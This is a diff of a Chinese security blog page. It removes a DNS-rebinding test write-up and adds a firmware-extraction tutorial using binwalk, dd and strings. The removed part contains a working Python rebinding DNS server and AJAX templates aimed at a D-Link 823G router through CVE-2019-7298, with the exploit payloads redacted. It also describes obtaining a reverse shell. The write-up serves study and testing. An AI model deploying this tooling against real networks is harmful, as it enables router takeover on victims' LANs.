@@ -80,7 +80,7 @@
 
 
 
-  <meta name="keywords" content="DNSRebind,漏洞利用," />
+  <meta name="keywords" content="IoT,固件,分析," />
 
 
 
@@ -93,21 +93,44 @@
 
 
 
-<meta name="description" content="DNS_Rebind原理为了保证DNS服务的可靠性，DNS响应记录A中包含一个TTL（time to live）值，表示当前解析结果的有效时间，客户端（浏览器）会在超过这个时间值后重新请求解析域名（取决于客户端是否遵循这个TTL值），得到的新响应中又会存在一个过期时间，客户端会再次去解析域名，如此保证获取到最新的域名解析结果。 若DNS服务前后响应返回的ip地址不一样，浏览器并不会认为跨域。如果域">
-<meta name="keywords" content="DNSRebind,漏洞利用">
+<meta name="description" content="整理一些基本的概念和一些固件解压的方法，不能太依赖binwalk，如果binwalk解压不出来，那岂不是一点招都没有了。 固件固件不是硬件，而是软件。在嵌入式设备中，通常是被固化在只读存储器中，所以被称为固件。 文件系统文件系统是操作系统的重要组成部分，是操作运行的基础。但是不同的嵌入式设备使用的文件系统都不一样。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。 嵌入式设备中">
+<meta name="keywords" content="IoT,固件,分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DNSRebind测试笔记">
-<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;post&#x2F;15454.html">
+<meta property="og:title" content="固件解压分析工具及方法整理">
+<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;post&#x2F;7dc2b2.html">
 <meta property="og:site_name" content="TT">
-<meta property="og:description" content="DNS_Rebind原理为了保证DNS服务的可靠性，DNS响应记录A中包含一个TTL（time to live）值，表示当前解析结果的有效时间，客户端（浏览器）会在超过这个时间值后重新请求解析域名（取决于客户端是否遵循这个TTL值），得到的新响应中又会存在一个过期时间，客户端会再次去解析域名，如此保证获取到最新的域名解析结果。 若DNS服务前后响应返回的ip地址不一样，浏览器并不会认为跨域。如果域">
+<meta property="og:description" content="整理一些基本的概念和一些固件解压的方法，不能太依赖binwalk，如果binwalk解压不出来，那岂不是一点招都没有了。 固件固件不是硬件，而是软件。在嵌入式设备中，通常是被固化在只读存储器中，所以被称为固件。 文件系统文件系统是操作系统的重要组成部分，是操作运行的基础。但是不同的嵌入式设备使用的文件系统都不一样。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。 嵌入式设备中">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1111111111111111111111.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;22222222222222.gif">
-<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;33333333333333.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;DNS_Rebind_revershell.gif">
-<meta property="og:updated_time" content="2019-11-06T08:34:40.536Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103194436077.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103195839036.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103200044122.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103200559319.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103201356488.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103233812796.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191105181148263.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191105181232646.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103205700709.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103205819179.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191105174637703.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191105182511902.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106153809813.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106153957693.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106164741622.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106165240644.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106165829158.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106170029255.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191105182421398.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106173136394.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106173315351.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106173426913.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106173810837.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106175319206.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106174558913.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106175050303.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191106175803536.png">
+<meta property="og:updated_time" content="2019-12-10T08:28:08.708Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;1111111111111111111111.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;file.smilehacker.net&#x2F;image-20191103194436077.png">
 
 
 
@@ -137,13 +160,13 @@
 
 
 
-  <link rel="canonical" href="https://blog.pwntools.xyz/post/15454.html"/>
+  <link rel="canonical" href="https://blog.pwntools.xyz/post/7dc2b2.html"/>
 
 
 
 
 
-  <title>DNSRebind测试笔记 | TT</title>
+  <title>固件解压分析工具及方法整理 | TT</title>
   
 
 
@@ -333,7 +356,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/15454.html">
+    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/7dc2b2.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="TT">
@@ -350,7 +373,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DNSRebind测试笔记</h1>
+          <h1 class="post-title" itemprop="name headline">固件解压分析工具及方法整理</h1>
         
 
         <div class="post-meta">
@@ -362,8 +385,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-29T12:40:59+08:00">
-                2019-10-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T16:23:32+08:00">
+                2019-12-10
               </time>
             
 
@@ -385,18 +408,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞利用</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/IoT/" itemprop="url" rel="index">
+                  <a href="/categories/IoT/" itemprop="url" rel="index">
                     <span itemprop="name">IoT</span>
                   </a>
                 </span>
@@ -414,9 +426,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/post/15454.html#comments" itemprop="discussionUrl">
+                <a href="/post/7dc2b2.html#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="post/15454.html" itemprop="commentCount"></span>
+                        data-disqus-identifier="post/7dc2b2.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -424,7 +436,7 @@
 
           
           
-             <span id="/post/15454.html" class="leancloud_visitors" data-flag-title="DNSRebind测试笔记">
+             <span id="/post/7dc2b2.html" class="leancloud_visitors" data-flag-title="固件解压分析工具及方法整理">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -455,207 +467,234 @@
       
 
       
-        <h4 id="DNS-Rebind原理"><a href="#DNS-Rebind原理" class="headerlink" title="DNS_Rebind原理"></a>DNS_Rebind原理</h4><p>为了保证<code>DNS</code>服务的可靠性，<code>DNS</code>响应记录<code>A</code>中包含一个<code>TTL（time to live）</code>值，表示当前解析结果的有效时间，客户端（浏览器）会在超过这个时间值后重新请求解析域名（取决于客户端是否遵循这个TTL值），得到的新响应中又会存在一个过期时间，客户端会再次去解析域名，如此保证获取到最新的域名解析结果。</p>
-<p>若DNS服务前后响应返回的<code>ip</code>地址不一样，浏览器并不会认为跨域。如果域名后续解析到的<code>ip</code>为<code>127.0.0.1</code>、<code>192.168.0.1</code>等不同于先前解析结果，浏览器依然认为符合同源策略，会将请求发送到<code>127.0.0.1</code>机器上。如此就产生了dns rebinding攻击，从而达到绕过同源策略的目的.</p>
-<p>浏览器和操作系统均会存在DNS缓存，缓存时间一般不按照DNS服务器响应中的TTL值。详细见<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
-<ul>
-<li>chrome为60s左右</li>
-<li>firefox 默认为60s ,可修改</li>
-<li>IE为30min</li>
-</ul>
+        <p>整理一些基本的概念和一些固件解压的方法，不能太依赖<code>binwalk</code>，如果<code>binwalk</code>解压不出来，那岂不是一点招都没有了。</p>
+<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>固件不是硬件，而是软件。在嵌入式设备中，通常是被固化在只读存储器中，所以被称为固件。</p>
+<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统是操作系统的重要组成部分，是操作运行的基础。但是不同的嵌入式设备使用的文件系统都不一样。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。</p>
+<p>嵌入式设备中肯定希望文件系统越小越好，因为在路由器设备中，存储设备的大小是分厂有限的，所以这些文件系统中各种压缩格式随处可见。</p>
+<p><code>Squashfs</code>是一个只读格式的文件系统。当系统启动后，会将文件系统保存在一个压缩过的文件系统中，这个文件可以使用换回的形式挂在并对其中的文件进行访问，当程序需要访问某些文件时，仅对部分的压缩文件解压缩。<code>Squashfs</code>常用的压缩格式有<code>Gzip</code>,<code>LZMA</code>,<code>LZO</code>,<code>XZ(LZMA2)</code>。嵌入式设备的根文件系统会按照<code>Squashfs</code>文件系统常用压缩格式中的一种进行打包，形成一个完整的<code>Squashfs</code>文件系统，然后与路由器操作系统的内核一起形成固件。</p>
 <a id="more"></a>
 
-<h4 id="DNS-Rebind攻击场景"><a href="#DNS-Rebind攻击场景" class="headerlink" title="DNS_Rebind攻击场景"></a>DNS_Rebind攻击场景</h4><ol>
-<li>受害者访问攻击者的网站<code>www.smilehacker.net</code>,此时的<code>DNS</code>服务正常解析到有一个外网网站</li>
-<li>但是网站中有一个隐藏的<code>&lt;iframe&gt;</code>标签,存在使用<code>AJAX</code>发送请求到<code>http://www.smilehacker.net/HNAP1/</code>,在<code>POST</code>数据包中存在对<code>D-Link 823G</code>的漏洞利用代码，</li>
-<li>发送<code>&lt;iframe&gt;</code>标签中的<code>AJAX</code>请求,此时<code>DNS</code>的解析已经改变，受害者发送<code>POC</code>到<code>D-Link</code>路由器</li>
-</ol>
-<h4 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h4><p>看起来一切都很顺利，而且容易，但是这都是建立在<code>TTL=0</code>的情况下。</p>
-<p>什么是TTL?</p>
-<p><code>TTL(Time to Live)</code>是<code>DNS</code>的缓存时间。当<code>TTL=10</code>的时候，我们在10s内，对该域名进行多次<code>DNS</code>请求，<code>DNS</code>服务器只会收到一次请求，其他都是缓存</p>
-<p>所以我们在搭建<code>DNS</code>服务器的时候，需要设置<code>TTL=0</code>,如果<code>TTL</code>不为0，第二次请求的是第一次缓存的外网IP，也就不能绕过。</p>
-<p><code>JAVA</code>程序中默认的TTL=10,这个配置会导致<code>DNS Rebind</code>绕过失败，<code>JAVA</code>程序默认不受<code>DNS Rebind</code>的影响</p>
-<h4 id="DNS请求过程"><a href="#DNS请求过程" class="headerlink" title="DNS请求过程"></a>DNS请求过程</h4><ol>
-<li>查询本地DNS服务器(/etc/resolv.conf) [自己设置的8.8.8.8 114.114.114.114这种的]</li>
-<li>如果有缓存则直接返回缓存的结果,不继续往下执行</li>
-<li>如果没有缓存,则请求远程DNS服务器，然后返回</li>
-</ol>
-<h4 id="DNS缓存机制-巨坑！！"><a href="#DNS缓存机制-巨坑！！" class="headerlink" title="DNS缓存机制 [巨坑！！]"></a>DNS缓存机制 [巨坑！！]</h4><p><code>MAC</code>跟<code>Windows</code>上,为了加快<code>HTTP</code>访问速度，系统都会进行<code>DNS</code>缓存。但是在<code>Linux</code>上默认不会进行缓存,除非运行了<code>nscd</code>软件。</p>
-<p>但是有些公共的DNS,比如百度的<code>114.114.114.114</code>,即使我们设置了<code>TTL=0</code>,依然会有两分钟的缓存，完全不按照标准协议来。遇到这种情况是无解的。</p>
+
+<h2 id="提取常用工具"><a href="#提取常用工具" class="headerlink" title="提取常用工具"></a>提取常用工具</h2><h3 id="Linux自带工具"><a href="#Linux自带工具" class="headerlink" title="Linux自带工具"></a>Linux自带工具</h3><ul>
+<li><code>file</code> 用来检测是否是有效的文件和文件类型</li>
+<li><code>xxd</code> 会生成给定文件或者输入的十六进制格式</li>
+<li><code>hexdump</code> 16进制查看工具</li>
+<li><code>strings</code> 展示输入程序中可识别的字符串</li>
+<li><code>dd</code>  用于复制文件并对原文件的内容进行转换和格式化处理 </li>
+<li><code>lzma</code> 解压<code>LZMA</code>文件</li>
+<li><code>grep</code>超级牛逼的文本搜索工具</li>
+<li><code>unsquashfs</code> 用于解压<code>squashfs</code>的文件格式</li>
+</ul>
+<p>这里提供两个网站，如果看不懂命令可以直接上去查。</p>
 <ul>
-<li>8.8.8.8 本地不会进行<code>DNS</code>缓存。</li>
-<li>114.114.114.114 会有两分钟的缓存</li>
+<li><a href="https://man.linuxde.net/" target="_blank" rel="noopener">https://man.linuxde.net/</a></li>
+<li><a href="https://www.explainshell.com/" target="_blank" rel="noopener">https://www.explainshell.com/</a></li>
 </ul>
-<p>除了公共DNS缓存的问题,浏览器也会有DNS缓存<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
-<ul>
-<li>chrome 一分钟缓存</li>
-<li>firefox 默认一分钟缓存(可修改)</li>
-<li>IE 30分钟的缓存</li>
-<li>QQ浏览器 40分钟左右缓存</li>
-<li>Opear 不关掉窗口,缓存一直存在</li>
+<h3 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h3><ul>
+<li><code>Binwalk</code></li>
+<li><code>IDA</code></li>
+<li><code>ghidra</code> 相比于IDA，这个更适合嵌入式分析</li>
+<li><a href="https://github.com/rampageX/firmware-mod-kit" target="_blank" rel="noopener">firmware-mod-kit</a></li>
 </ul>
-<h4 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h4><ol>
-<li><p>查看浏览器内部缓存</p>
-</li>
-<li><p>系统缓存</p>
-</li>
-<li><p>路由器缓存、ISP 缓存</p>
-</li>
-<li><p>本地 DNS 服务器</p>
-<p>例如:8.8.8.8 114.114.114.114</p>
-</li>
-<li><p>域名服务器</p>
-</li>
-</ol>
-<p>如果域名正常，应该就会返回 IP 地址，如果没有浏览器就会提示找不到服务器地址。</p>
-<h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><p>使用DNS Rebind利用<a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank" rel="noopener"><code>CVE-2019-7298</code></a>漏洞攻击<code>D-Link 823G</code>路由器</p>
-<p>首先，需要有一个域名,在域名下解析两条记录</p>
-<p><img src="http://file.smilehacker.net/1111111111111111111111.png" alt="域名解析"></p>
-<p>当访问<code>dns_rebind.smilehacker.net</code>的时候，去找负责解析他的<code>ns.smilehacker.net</code>，也就是<code>43.228.76.56</code>这台机器。</p>
-<p>DNS Server的代码如下:<br>使用前安装<code>twisted</code></p>
-<blockquote>
-<p>pip install twisted -i <a href="https://pypi.douban.com/simple" target="_blank" rel="noopener">https://pypi.douban.com/simple</a></p>
-</blockquote>
-<pre><code class="python">from twisted.internet import reactor, defer
-from twisted.names import client, dns, error, server
-record={}
-class DynamicResolver(object):
-    def _doDynamicResponse(self, query):
-        name = query.name.name
-        if name not in record or record[name]&lt;1:
-            ip = &quot;43.228.76.56&quot;
-        else:
-            ip = &quot;192.168.0.1&quot;
-        if name not in record:
-            record[name] = 0
-        record[name] += 1
-        print name + &quot; ===&gt; &quot; + ip
-        answer = dns.RRHeader(
-            name = name,
-            type = dns.A,
-            cls = dns.IN,
-            ttl = 0,
-            payload = dns.Record_A(address = b&#39;%s&#39; % ip, ttl=0)
-        )
-        answers = [answer]
-        authority = []
-        additional = []
-        return answers, authority, additional
-    def query(self, query, timeout=None):
-        return defer.succeed(self._doDynamicResponse(query))
-def main():
-    factory = server.DNSServerFactory(
-        clients=[DynamicResolver(), client.Resolver(resolv=&#39;/etc/resolv.conf&#39;)]
-    )
-    protocol = dns.DNSDatagramProtocol(controller=factory)
-    reactor.listenUDP(53, protocol)
-    reactor.run()
-if __name__ == &#39;__main__&#39;:
-    raise SystemExit(main())
-</code></pre>
-<p>代码功能:</p>
-<ul>
-<li>第一次DNS请求返回的IP为43.228.76.56，其余时候返回的都是路由器的IP(192.168.0.1)。</li>
-</ul>
-<p>剩下只需要把漏洞利用代码放到HTML中就可以了</p>
-<p><strong>具体漏洞利用代码已经删除,有兴趣的可自行Google</strong></p>
-<p>index.html:</p>
-<pre><code class="HTML">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
-    &lt;title&gt;&lt;/title&gt;
-
-&lt;/head&gt;
-&lt;body&gt;
-&lt;iframe src=&quot;ajax.html&quot;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>ajax.html</p>
-<pre><code class="HTML">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;Title&lt;/title&gt;
-    &lt;script src=&quot;./jquery.min.js&quot;&gt;&lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;script&gt;
-
-    var xmg_01 = &quot;payload1&quot;;
-
-    var xmg_02 = &quot;payload2&quot;;
-
-    function foo(){
-        var settings = {
-            &quot;async&quot;: true,
-            &quot;crossDomain&quot;: true,
-            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
-            &quot;method&quot;: &quot;POST&quot;,
-            &quot;headers&quot;: {
-                &quot;Content-Type&quot;: &quot;application/xml&quot;,
-                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
-                &quot;cache-control&quot;: &quot;no-cache&quot;,
-                &quot;Postman-Token&quot;: &quot;68b84160-c326-4b1a-a001-83b408d6435f&quot;
-            },
-            &quot;data&quot;: &quot;payload1&quot;
-        };
-
-        $.ajax(settings).done(function (response) {
-            document.write(response);
-        });
-
-        var setting = {
-            &quot;async&quot;: true,
-            &quot;crossDomain&quot;: true,
-            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
-            &quot;method&quot;: &quot;POST&quot;,
-            &quot;headers&quot;: {
-                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
-                &quot;cache-control&quot;: &quot;no-cache&quot;,
-                &quot;Postman-Token&quot;: &quot;a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b&quot;
-            },
-            &quot;data&quot;: &quot;payload2&quot;
-        };
-
-        $.ajax(setting).done(function (response) {
-            test();
-            document.write(response);
-        });
-
-
-    }
-
-    function test(){
-        document.write(&quot;test&quot;);
-    }
-
-&lt;/script&gt;
-
-&lt;input value=&quot;点&quot; type=&quot;button&quot; onclick=&quot;foo()&quot;&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<h4 id="攻击展示图"><a href="#攻击展示图" class="headerlink" title="攻击展示图:"></a>攻击展示图:</h4><ul>
-<li>攻击场景1:<br>此处修改了Firefox的DNS缓存时间为0,比且修改了DNS Server中域名返回外网IP的次数</li>
-</ul>
-<p><img src="http://file.smilehacker.net/22222222222222.gif" alt="Rebind show"></p>
-<p>如果该测试放在Chrome下做，需要等待一分钟，等Chrome刷掉自己的DNS缓存</p>
-<p>firefox配置:</p>
+<p>关于工具的安装就不提了，详细参考<a href="https://blog.pwntools.xyz/2019/10/18/IoT测试环境搭建/#more">IoT测试环境搭建</a></p>
+<h2 id="手动解压固件"><a href="#手动解压固件" class="headerlink" title="手动解压固件"></a>手动解压固件</h2><p>这里随便找一款<code>Dlink</code>的路由器的固件来分析,型号是<code>Dlink dir-815</code>，<code>Binwalk</code>分以一下固件的熵，如果很高，作为练习就可以换一款了。</p>
+<p>使用<code>file</code>查看文件:</p>
+<p><img src="http://file.smilehacker.net/image-20191103194436077.png" alt="image-20191103194436077"></p>
+<p><code>file</code>没有发现符合的任何文件类型的匹配，但是不代表固件就是完全没接触过的格式。因为file是从首字节开始的，他会按照内部的数据进行比对。</p>
+<h3 id="手动判断文件类型"><a href="#手动判断文件类型" class="headerlink" title="手动判断文件类型"></a>手动判断文件类型</h3><p><code>file</code>没有发现符合的文件格式，我们就需要采用下面的方法分析.</p>
 <ol>
-<li>在地址栏输入<code>about:config</code></li>
-<li>搜索<code>dns</code>，将network.dnsCacheExpiration、network.dnsCacheExpirationGracePeriod修改为0<br><img src="http://file.smilehacker.net/33333333333333.png" alt="firefox配置"></li>
+<li>“strings|grep”检索文件系统的<code>magic</code>签名头</li>
+<li>“hexdumo|grep” 检索<code>magic</code>签名的偏移</li>
+<li>“dd|file”确认<code>magic</code>签名偏移处的文件系统。</li>
 </ol>
+<p>文件系统的<code>magic</code>签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统。当然，如果要确认包含的文件系统，还需要利用其他条件配合证命，(2，3做的)</p>
+<h4 id="检索magic签名头"><a href="#检索magic签名头" class="headerlink" title="检索magic签名头"></a>检索<code>magic</code>签名头</h4><p>头部的特征都是根据每种文件系统开头的几百字节提炼出来的。常用的如下:</p>
 <ul>
-<li>攻击场景2:</li>
+<li><code>cramfs</code>文件系统头部特征为<code>0x28cd3d45</code></li>
+<li><code>squashfs</code>文件系统头部特征较多，其中一些是标准的<code>squashfs</code>头部,有些是老外研究发现的大概有<code>sqsh</code>,<code>hsqs</code>,<code>qshs</code>,<code>shsq</code>,<code>hsqt</code>,<code>tqsh</code>,<code>sqlz</code>这七种。</li>
 </ul>
-<p>Windows 操作系统、DNS server 为 8.8.8.8、Chrome浏览器默认配置访问<code>URL</code>链接，直接获取路由器反弹shell，等待一分钟左右<br><img src="http://file.smilehacker.net/DNS_Rebind_revershell.gif" alt="Reverse_shell"></p>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
-<li><a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">https://dyn.com/blog/web-browser-dns-caching-bad-thing/</a></li>
-<li><a href="https://blog.csdn.net/u014465934/article/details/83241097" target="_blank" rel="noopener">https://blog.csdn.net/u014465934/article/details/83241097</a></li>
-<li><a href="https://blog.csdn.net/u011721501/article/details/54667714" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/54667714</a></li>
+<p>先检查是否存在<code>cfamfs</code>文件系统头部特征。因为我们不知道文件系统时大端序还是小端序，我们需要执行两次</p>
+<pre><code class="shell">strings DIR_815.bin | grep `python -c &#39;print &quot;\x28\xcd\x3d\x45&quot;&#39;`
+strings DIR_815.bin | grep `python -c &#39;print &quot;\x45\x3d\xcd\x28&quot;&#39;`</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103195839036.png" alt="image-20191103195839036"></p>
+<p>没有发现<code>cfamfs</code>的头部特征，然后使用相同的办法，去检查是否存在<code>squashfs</code>的头部特征</p>
+<p><img src="http://file.smilehacker.net/image-20191103200044122.png" alt="image-20191103200044122"></p>
+<p>找到了一个，但是我们不能确定该文件是不是一个<code>squashfs</code>文件系统，还需要进一步确定。</p>
+<h4 id="确定文件系统"><a href="#确定文件系统" class="headerlink" title="确定文件系统"></a>确定文件系统</h4><p>使用如下命令检测是否针对包含<code>squashfs</code>文件系统。</p>
+<pre><code class="shell">hexdump -C DIR_815.bin | grep -n &#39;hsqs&#39;
+
+# hexdump -C参数: 输出规范的十六进制和ASCII码。
+# grep -n参数: 在显示符合范本样式的那一列之前，标示出该列的编号。</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103200559319.png" alt="image-20191103200559319"></p>
+<p>在偏移<code>0x000f008C</code>处发现了<code>hsqs</code>,我们从<code>0x000f0080C</code>这个地方复制<code>100</code>字节数据，再使用<code>file</code>命令查看。使用<code>dd</code>命令</p>
+<p>为什么时100字节？因为<code>squashfs</code>文件系统的头部校验不会超过100字节</p>
+<pre><code class="shell">dd if=DIR_815.bin bs=1 count=100 skip=983180 of=test
+
+# dd 可以跨文件、设备、分区和卷复制数据
+# if 标准文件输入
+# of 标准文件输出
+# bs 块大小
+# skip 用于跳过指向固件二进制映像中特定地址的指针</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103201356488.png" alt="image-20191103201356488"></p>
+<p>这次就识别出来了。一定注意这里的文件大小<code>2808054</code></p>
+<h3 id="手动提取固件"><a href="#手动提取固件" class="headerlink" title="手动提取固件"></a>手动提取固件</h3><p>我们知道了在固件偏移<code>983180(0x000f0080C)</code>的地方，我们继续用<code>dd</code>提取出文件文件，然后尝试手动提取。</p>
+<pre><code class="shell">dd if=DIR_815.bin bs=1 skip=983180 count=2808054 of=test </code></pre>
+<p>这里一定要指定<code>count</code>，直接提取到文件末尾。在这中间我们还需要检查<code>squashfs</code>使用的压缩算法。</p>
+<p><img src="http://file.smilehacker.net/image-20191103233812796.png" alt="image-20191103233812796"></p>
+<p>可以看到时<code>lzma</code>的格式，我们可以使用ubuntu自带的<code>unsquashfs</code>来解压，但是这个工具并不好用，我们可以使用<code>firmware-mod-kit</code>来解压。其实<code>firmware-mod-kit</code>也是调用<code>binwalk</code>来做的</p>
+<pre><code class="shell">./unsquashfs_all.sh ../Desktop/dir815_FW_101/_DIR_815.bin.extracted/F008C.squashfs</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191105181148263.png" alt="image-20191105181148263"></p>
+<p>可以在目录下看到我们解压出来的文件</p>
+<p><img src="http://file.smilehacker.net/image-20191105181232646.png" alt="image-20191105181232646"></p>
+<h2 id="自动解压固件"><a href="#自动解压固件" class="headerlink" title="自动解压固件"></a>自动解压固件</h2><p>自动解压固件就不多介绍了，<code>binwalk -Me</code>直接解压，在这里记录一下<code>binwalk</code>的几个用法</p>
+<h3 id="扫描文件头"><a href="#扫描文件头" class="headerlink" title="扫描文件头"></a>扫描文件头</h3><pre><code class="shell">binwalk DIR_815.bin</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103205700709.png" alt="image-20191103205700709"></p>
+<h3 id="Binwalk递归解压固件"><a href="#Binwalk递归解压固件" class="headerlink" title="Binwalk递归解压固件"></a>Binwalk递归解压固件</h3><pre><code class="shell">binwalk -Me DIR_815.bin</code></pre>
+<p>解压的明明白白</p>
+<p><img src="http://file.smilehacker.net/image-20191103205819179.png" alt="image-20191103205819179"></p>
+<h3 id="Binwalk识别大端序小端序"><a href="#Binwalk识别大端序小端序" class="headerlink" title="Binwalk识别大端序小端序"></a>Binwalk识别大端序小端序</h3><pre><code class="shell">binwalk -A DIR_815.bin</code></pre>
+<p>不是很准确</p>
+<h3 id="Binwalk-熵值分析"><a href="#Binwalk-熵值分析" class="headerlink" title="Binwalk 熵值分析"></a>Binwalk 熵值分析</h3><pre><code class="shell">binwalk -E DIR_815.bin
+
+# python2需要安装sudo apt-get install python-matplotlib
+# python3需要安装sudo apt-get install python3-matplotlib</code></pre>
+<p>根据熵值可以判断该固件是否加密。</p>
+<p><img src="http://file.smilehacker.net/image-20191105174637703.png" alt="image-20191105174637703"></p>
+<p>  简单地说，一个系统越是有序，信息熵就越低；反之，一个系统越是混乱，信息熵就越高。 </p>
+<p><code>Binwalk</code>没什么好说的，看看官方文档就好了。</p>
